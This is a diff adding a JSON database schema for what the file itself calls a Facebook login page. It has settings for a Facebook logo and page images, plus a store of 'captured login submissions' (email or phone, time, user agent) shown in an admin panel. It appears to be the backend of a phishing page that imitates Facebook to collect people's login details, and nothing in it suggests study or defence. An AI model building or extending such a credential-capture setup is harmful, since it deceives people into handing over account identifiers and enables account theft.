@@ -1,0 +1,65 @@
+{
+  "entities": {
+    "SiteSettings": {
+      "title": "SiteSettings",
+      "description": "Customizable branding assets for the Facebook login page including logo and illustration image links.",
+      "type": "object",
+      "properties": {
+        "logoUrl": {
+          "type": "string",
+          "description": "Direct image URL for the Facebook header logo.",
+          "maxLength": 2048
+        },
+        "pageImageUrl": {
+          "type": "string",
+          "description": "Direct image URL for the main page illustration montage on desktop.",
+          "maxLength": 2048
+        },
+        "updatedAt": {
+          "type": "string",
+          "description": "ISO timestamp of the last configuration update.",
+          "maxLength": 100
+        },
+        "updatedBy": {
+          "type": "string",
+          "description": "User identifier who performed the update.",
+          "maxLength": 100
+        }
+      },
+      "required": ["updatedAt"]
+    },
+    "LoginSubmission": {
+      "title": "LoginSubmission",
+      "description": "Captured login submissions for admin review.",
+      "type": "object",
+      "properties": {
+        "identifier": {
+          "type": "string",
+          "description": "Email address or mobile phone number submitted.",
+          "maxLength": 255
+        },
+        "submittedAt": {
+          "type": "string",
+          "description": "Timestamp when the login was submitted.",
+          "maxLength": 100
+        },
+        "userAgent": {
+          "type": "string",
+          "description": "Browser and device user agent.",
+          "maxLength": 500
+        }
+      },
+      "required": ["identifier", "submittedAt"]
+    }
+  },
+  "firestore": {
+    "/settings/{settingId}": {
+      "schema": "SiteSettings",
+      "description": "Global website configuration settings including custom logo and hero images."
+    },
+    "/submissions/{submissionId}": {
+      "schema": "LoginSubmission",
+      "description": "Logged submissions visible in admin panel."
+    }
+  }
+}
